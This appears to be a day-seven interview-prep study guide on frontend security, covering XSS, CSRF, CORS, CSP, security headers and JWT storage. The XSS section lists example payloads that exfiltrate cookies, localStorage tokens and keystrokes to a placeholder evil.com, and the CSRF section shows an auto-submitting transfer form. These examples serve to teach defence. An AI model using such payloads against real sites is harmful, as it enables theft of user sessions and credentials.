# 🔐 Frontend System Design — Day 7
## Topic: Security Fundamentals

> **Study time:** 1 hour | **Phase:** 1 of 5 | **Difficulty:** Intermediate
> **Interview frequency:** ⭐⭐⭐⭐⭐ (Every senior frontend interview — FAANG, Razorpay, CRED, Flipkart)

---

## The Big Picture

Security is non-negotiable at senior level. Every company has been breached.
Interviewers expect you to catch security issues during code review, not just build features.

```
┌──────────────────────────────────────────────────────────────────────┐
│  4 ATTACKS to know cold:                                             │
│                                                                      │
│  XSS          Attacker injects JS into your page                    │
│  CSRF         Attacker tricks browser into making requests           │
│  Clickjacking Attacker overlays your page in hidden iframe           │
│  MITM         Attacker intercepts HTTP traffic (HTTPS prevents this) │
│                                                                      │
│  4 DEFENCES to know cold:                                            │
│                                                                      │
│  CSP headers  Whitelist allowed script/style/resource sources        │
│  Cookie flags HttpOnly + Secure + SameSite                          │
│  CORS         Whitelist which origins can read your API responses    │
│  HTTPS        Encrypt all traffic — prevents MITM                   │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Attack 1 — XSS (Cross-Site Scripting)

### What it is

Attacker injects malicious JavaScript into your page. It runs in victims' browsers
with your site's full privileges — can steal cookies, localStorage, make API calls
as the user, redirect to phishing pages.

### 3 Types of XSS

```
1. STORED XSS (worst)
   → Attacker saves malicious script to your database
   → Every user who views that page runs the script
   Example: Forum comment containing <script>fetch('evil.com?c='+document.cookie)</script>

2. REFLECTED XSS
   → Script in URL parameter, server reflects it back in HTML
   → Attacker sends malicious URL to victim
   Example: site.com/search?q=<script>...</script>
   Server: <p>Results for: <script>...</script></p>  ← rendered as HTML

3. DOM-BASED XSS
   → Frontend JS reads from URL/DOM and writes it unsanitised to page
   → No server involved — pure frontend vulnerability
   Example: document.getElementById('output').innerHTML = location.hash
```

### Attack Payloads

```html
<!-- Steal cookies -->
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

<!-- Steal localStorage (JWT tokens) -->
<img src=x onerror="fetch('https://evil.com/'+localStorage.getItem('token'))">

<!-- Keylogger -->
<script>document.addEventListener('keydown',e=>fetch('https://evil.com/'+e.key))</script>

<!-- Redirect to phishing page -->
<script>location.href='https://evil-clone.com'</script>

<!-- In href attribute -->
<a href="javascript:alert(document.cookie)">Click me</a>
```

### Why HttpOnly cookies partially save you

```
Even if XSS succeeds:
  → document.cookie CANNOT read HttpOnly cookies
  → Attacker cannot steal the session token
  → But attacker can still MAKE requests as the user (CSRF-like impact)
  → HttpOnly protects theft, not misuse
```

### Defences

```javascript
// 1. Use textContent not innerHTML for user data
element.textContent = userInput;      // SAFE — auto-escapes HTML
element.innerHTML = userInput;        // DANGEROUS — renders as HTML

// 2. React JSX is safe by default
const Comment = ({ text }) => <div>{text}</div>;  // auto-escaped — SAFE
const Comment = ({ text }) => <div dangerouslySetInnerHTML={{__html: text}}/> // DANGEROUS

// 3. Angular is safe by default
<p>{{ userInput }}</p>  // auto-escaped — SAFE
<p [innerHTML]="userInput"></p>  // only safe with DomSanitizer

// 4. Sanitise rich HTML with DOMPurify
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(userInput); // removes dangerous tags/attrs
element.innerHTML = clean;  // now safe

// 5. Avoid dangerous patterns
eval(userInput)            // NEVER
document.write(userInput)  // NEVER
setTimeout(userInput, 0)   // NEVER (string setTimeout executes as code)
new Function(userInput)()  // NEVER

// 6. Escape for HTML context (server-side)
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

---

## Attack 2 — CSRF (Cross-Site Request Forgery)

### What it is

Attacker tricks user's browser into making an authenticated request to your site.
Browser automatically sends cookies with every request — attacker exploits this.

### How the Attack Works

```
1. User logs into bank.com → session cookie stored in browser
2. Same browser visits evil.com (attacker's site)
3. evil.com contains hidden code:

   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="50000">
   </form>
   <script>document.forms[0].submit()</script>

4. Browser sends POST to bank.com WITH the session cookie
5. Bank sees valid authenticated request → transfers money

The user did nothing wrong — browser just followed instructions.
```

### Why CORS does NOT protect against CSRF

```
CORS controls what JS can READ from cross-origin responses.
CSRF doesn't need to read anything — it just needs the request to HAPPEN.
The form submission above doesn't read the response.
CORS completely irrelevant here.
```

### Defences

```javascript
// 1. SameSite cookie flag (BEST defence)
Set-Cookie: sessionId=abc; SameSite=Strict; HttpOnly; Secure

// SameSite=Strict: cookie NEVER sent on cross-site requests
// SameSite=Lax: sent for top-level navigations (links), not forms/fetch
// SameSite=None: always sent (must also set Secure)

// 2. CSRF tokens
// Server generates random token, stores in session
// Adds to every HTML form as hidden field
<input type="hidden" name="csrf_token" value="rnd_xyz_abc_123">
// Server validates token on POST/PUT/DELETE
// Attacker cannot read the token (same-origin policy) so can't forge

// 3. Custom request headers (for fetch/AJAX)
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',  // custom header
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(data)
});
// Cross-site forms CANNOT set custom headers → server can verify

// 4. Angular automatic CSRF protection
// Angular HttpClient reads XSRF-TOKEN cookie and sends X-XSRF-TOKEN header
// Configure on backend to validate this header

// 5. Verify Origin header on server
// reject if Origin doesn't match expected domain
```

---

## CORS — Cross-Origin Resource Sharing

### What is "Same Origin"?

```
Same origin = same protocol + domain + port

https://app.com:443  →  https://app.com:443      SAME ✓
https://app.com:443  →  http://app.com:443       DIFFERENT ✗ (protocol)
https://app.com:443  →  https://api.app.com:443  DIFFERENT ✗ (subdomain)
https://app.com:443  →  https://app.com:3000     DIFFERENT ✗ (port)
https://app.com:443  →  https://other.com:443    DIFFERENT ✗ (domain)
```

### What CORS Does (and Doesn't Do)

```
CORS controls:
  → Whether JS can READ a cross-origin response

CORS does NOT control:
  → Whether the request is SENT (it always is)
  → Server-side access (server must check auth separately)

This distinction matters:
  → GET requests: sent, response blocked unless CORS headers present
  → POST with standard content-type: sent, response blocked unless CORS
  → POST with custom headers: preflight OPTIONS first, then actual request
```

### Server CORS Headers

```
Access-Control-Allow-Origin: https://app.com
  → Allow specific origin to read the response

Access-Control-Allow-Origin: *
  → Allow ANY origin — only for fully public APIs

Access-Control-Allow-Credentials: true
  → Allow cookies/auth headers in cross-origin requests
  → MUST use specific origin (not *) when credentials: true

Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
  → Which HTTP methods are allowed

Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
  → Which request headers are allowed

Access-Control-Max-Age: 86400
  → Cache preflight result for 24 hours (avoid repeated OPTIONS requests)

Access-Control-Expose-Headers: X-Total-Count
  → Which response headers JS can access
```

### Preflight Request Flow

```
// Complex request (custom headers, PUT/DELETE/PATCH, non-standard content-type)

Step 1: Browser sends OPTIONS preflight automatically
OPTIONS /api/data HTTP/1.1
Origin: https://app.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization, Content-Type

Step 2: Server responds to preflight
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400

Step 3: If preflight OK, browser sends actual request
DELETE /api/data HTTP/1.1
Origin: https://app.com
Authorization: Bearer token
```

### Common CORS Mistakes

```
MISTAKE 1: Using * with credentials
  Access-Control-Allow-Origin: *
  Access-Control-Allow-Credentials: true
  → Browser BLOCKS this — must use specific origin with credentials

MISTAKE 2: Not handling OPTIONS in Express
  app.use(cors())  // must also handle preflight OPTIONS requests

MISTAKE 3: Wildcard subdomain (not supported)
  Access-Control-Allow-Origin: *.app.com  // DOES NOT WORK
  → Must list specific subdomains or use dynamic origin validation

MISTAKE 4: Thinking CORS is a security feature
  → CORS is for BROWSER security — protects users from malicious JS
  → A server-side curl request completely bypasses CORS
  → Always validate auth on server regardless of CORS
```

---

## Content Security Policy (CSP)

### What CSP Does

```
Server sends CSP header → browser enforces a whitelist of allowed resources.
Even if XSS injects a <script>, browser won't run it if it's not in the CSP.
```

### Key CSP Directives

```
default-src 'self'
  → Fallback for all resource types not explicitly listed
  → 'self' = same origin only

script-src 'self' cdn.example.com 'nonce-RANDOM'
  → Only scripts from same origin, CDN, or with matching nonce
  → Blocks ALL inline scripts (unless nonce or hash specified)

style-src 'self' 'unsafe-inline'
  → Allow inline styles (often needed for CSS-in-JS frameworks)

img-src 'self' data: https:
  → Images from same origin, data URIs, or any HTTPS source

connect-src 'self' https://api.example.com
  → fetch/XMLHttpRequest/WebSocket connections

font-src 'self' fonts.gstatic.com
  → Web fonts sources

frame-ancestors 'none'
  → Prevents your page being embedded in ANY iframe (blocks clickjacking)
  → Replaces X-Frame-Options: DENY

base-uri 'self'
  → Prevents base tag injection (attacker can't change relative URL base)

upgrade-insecure-requests
  → Auto-upgrade all http:// requests to https://
```

### Production CSP Example

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{SERVER_GENERATED_RANDOM}';
  style-src 'self' 'unsafe-inline' fonts.googleapis.com;
  img-src 'self' data: https:;
  font-src 'self' fonts.gstatic.com;
  connect-src 'self' https://api.yoursite.com wss://ws.yoursite.com;
  frame-ancestors 'none';
  base-uri 'self';
  upgrade-insecure-requests;
```

### Nonce-based CSP (Strongest)

```html
<!-- Server generates new random nonce per request -->
<!-- Adds it to CSP header AND to script tags -->

HTTP header:
Content-Security-Policy: script-src 'nonce-rAnd0m123XyZ'

HTML:
<script nonce="rAnd0m123XyZ">
  // This script is allowed — nonce matches
  initApp();
</script>

<!-- Attacker's injected script: -->
<script>steal(document.cookie)</script>
<!-- Blocked — no nonce, doesn't match CSP -->
```

---

## Other Critical Security Headers

```
# Prevent clickjacking — page cannot be embedded in iframes
X-Frame-Options: DENY
# OR use CSP: frame-ancestors 'none' (modern replacement)

# Prevent MIME type sniffing attacks
X-Content-Type-Options: nosniff
# Browser must use declared Content-Type, won't guess

# Force HTTPS for 1 year
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# Browser never tries HTTP again — prevents downgrade attacks

# Control Referer header leakage
Referrer-Policy: strict-origin-when-cross-origin
# Cross-origin: sends only origin (not full URL)
# Prevents leaking sensitive URL params (tokens, IDs) to third parties

# Disable dangerous browser APIs
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
# Limits attack surface if XSS succeeds — can't access camera etc.
```

---

## Auth Token Security — Where to Store JWT

```
Option 1: localStorage (WRONG)
  → XSS can steal the token: localStorage.getItem('token')
  → Attacker runs malicious JS → exfiltrates token → full account takeover
  → Never store auth tokens here

Option 2: HttpOnly Cookie (CORRECT)
  → Server sets: Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
  → JS CANNOT read it: document.cookie does not include HttpOnly cookies
  → XSS cannot steal it
  → SameSite=Strict prevents CSRF
  → Browser sends automatically with every request

Option 3: Memory (Good for SPAs)
  → Store access token in JS variable (not localStorage)
  → Lost on page refresh → use refresh token in HttpOnly cookie to get new one
  → XSS can steal during session but cannot persist it
  → Best for short-lived access tokens (15 minutes)

RECOMMENDED PATTERN:
  Access token:  JS memory variable (short-lived: 15min)
  Refresh token: HttpOnly + Secure + SameSite=Strict cookie
  On page load:  use refresh token cookie to get fresh access token
  On expiry:     silently refresh using cookie
```

---

## Interview Questions & Model Answers

### Q1: "What is XSS and how do you prevent it?"

```
XSS = Cross-Site Scripting. Attacker injects malicious JS into your page.
Runs in victims' browsers with your site's full privileges.

3 types:
  Stored: script saved to DB, runs for every visitor
  Reflected: script in URL, server reflects it back
  DOM-based: frontend JS reads URL/DOM unsafely

Prevention:
  1. Never use innerHTML with user data — use textContent
  2. React/Angular escape by default — never bypass with dangerouslySetInnerHTML
  3. Sanitise rich HTML with DOMPurify before rendering
  4. CSP header blocks injected scripts from running
  5. HttpOnly cookies — even if XSS runs, can't steal session token

The key insight: frameworks protect you by default.
The risk is when you intentionally bypass them (innerHTML, eval).
```

### Q2: "Explain CSRF and how SameSite cookies prevent it"

```
CSRF = Cross-Site Request Forgery.
Attacker tricks the browser into making authenticated requests to your site.
Browser sends cookies automatically with every matching request.

Attack: evil.com has hidden form that POSTs to bank.com.
Browser sends request with bank.com's session cookie.
Bank processes it thinking user authorized it.

SameSite=Strict prevents this by telling the browser:
"Only send this cookie when the request originates from the SAME site."
Cross-origin form submissions, fetch requests → cookie NOT sent.
Attacker's form → no cookie → request fails authentication.

SameSite=Lax: sent for top-level navigations (links) but not form POSTs.
Good balance of security and usability for most apps.
```

### Q3: "What is CORS and why does it exist?"

```
CORS = Cross-Origin Resource Sharing.
The browser's same-origin policy blocks JS from reading responses
across different origins. CORS is how servers opt in to allow it.

It exists to protect users:
  Without it: any website could fetch your banking data
  With it: bank.com can restrict which origins can read its API responses

How it works:
  Server adds Access-Control-Allow-Origin header to responses.
  Browser checks if requesting origin is allowed.
  If not → JS gets blocked from reading the response.
  (The request still happened — CORS only controls reading)

Common mistake: thinking CORS is a security feature for the server.
It's not — it protects the browser/user.
Server must still validate auth headers separately.
```

### Q4: "How would you set up CSP for a React app?"

```
1. Start in report-only mode to catch violations without breaking anything:
   Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

2. Identify what sources the app legitimately uses:
   → Scripts: self + any CDNs
   → Styles: self + Google Fonts
   → Images: self + S3 bucket + data URIs
   → API calls: specific API domain

3. Build the policy:
   Content-Security-Policy:
     default-src 'self';
     script-src 'self' 'nonce-{NONCE}';
     style-src 'self' 'unsafe-inline' fonts.googleapis.com;
     img-src 'self' data: https://assets.yoursite.com;
     connect-src 'self' https://api.yoursite.com;
     font-src 'self' fonts.gstatic.com;
     frame-ancestors 'none';

4. Switch from report-only to enforce once clean

Note: React apps need 'unsafe-inline' for styles (CSS-in-JS)
or use nonce-based approach for strict mode.
```

---

## Cheat Sheet — Memorize Before Interviews

```
XSS — attacker injects JS into your page
  Prevent: textContent not innerHTML, CSP, DOMPurify, HttpOnly cookies
  Never: eval(userInput), innerHTML = userInput, document.write(userInput)

CSRF — tricks browser into making authenticated requests
  Prevent: SameSite=Strict cookies, CSRF tokens, custom headers
  Key: CORS does NOT protect against CSRF

CORS — browser blocks cross-origin response reading
  Allow: Access-Control-Allow-Origin: https://specific-origin.com
  Never: * with credentials: true
  Remember: request still GOES through — CORS only blocks JS READING it

CSP — whitelist allowed resource sources
  Blocks injected scripts even if XSS injection succeeds
  frame-ancestors 'none' → prevents clickjacking

COOKIE FLAGS (all 3 together):
  HttpOnly — JS cannot read the cookie
  Secure — only sent over HTTPS
  SameSite=Strict — not sent on cross-site requests

AUTH TOKENS:
  NEVER in localStorage (XSS steals it)
  USE HttpOnly cookies for session/refresh tokens
  Memory variable for short-lived access tokens

SECURITY HEADERS (memorize all 5):
  Content-Security-Policy
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Strict-Transport-Security: max-age=31536000
  Referrer-Policy: strict-origin-when-cross-origin
```

---

## Hands-On Task (20 mins)

1. Open any site → DevTools → Network → click any request → Response Headers
2. Look for these security headers — does the site have them?
   - `Content-Security-Policy`
   - `Strict-Transport-Security`
   - `X-Frame-Options`
3. Check cookies → Application tab → Cookies → look for HttpOnly, Secure, SameSite flags
4. Open a Google product (gmail.com) — they have excellent CSP, look at it
5. Try: `document.cookie` in console on a logged-in site — HttpOnly cookies should NOT appear

---

## Key Terms Glossary

| Term | Definition |
|------|-----------|
| **XSS** | Cross-Site Scripting — injecting malicious JS into a page |
| **CSRF** | Cross-Site Request Forgery — tricking browser into making requests |
| **CORS** | Cross-Origin Resource Sharing — browser policy for cross-origin reads |
| **CSP** | Content Security Policy — HTTP header whitelisting allowed resources |
| **Same-origin** | Same protocol + domain + port |
| **HttpOnly** | Cookie flag preventing JS access — protects against XSS token theft |
| **SameSite=Strict** | Cookie only sent from same site — prevents CSRF |
| **Nonce** | Random value added to CSP and script tags — allows specific inline scripts |
| **Preflight** | Browser's OPTIONS request to check CORS before actual request |
| **Clickjacking** | Attacker overlays invisible iframe to steal clicks |
| **HSTS** | HTTP Strict Transport Security — forces HTTPS |
| **DOMPurify** | Library that sanitises HTML to prevent XSS |
| **MITM** | Man-in-the-middle — attacker intercepts traffic (HTTPS prevents) |
| **Stored XSS** | Malicious script saved to database, runs for all visitors |
| **Reflected XSS** | Script in URL reflected back in server response |
| **DOM XSS** | Frontend JS reads URL/DOM unsafely without server involvement |

---

## What's Next

| Day | Topic | Why it matters |
|-----|-------|----------------|
| **Day 8** | Phase 1 Review | 5 timed questions across Days 1–7 — simulate an interview |
| **Day 9** | Performance Metrics & Tools | Lighthouse, WebPageTest, DevTools deep dive |
| **Day 10** | JS Performance | Code splitting, tree shaking, bundle optimization |

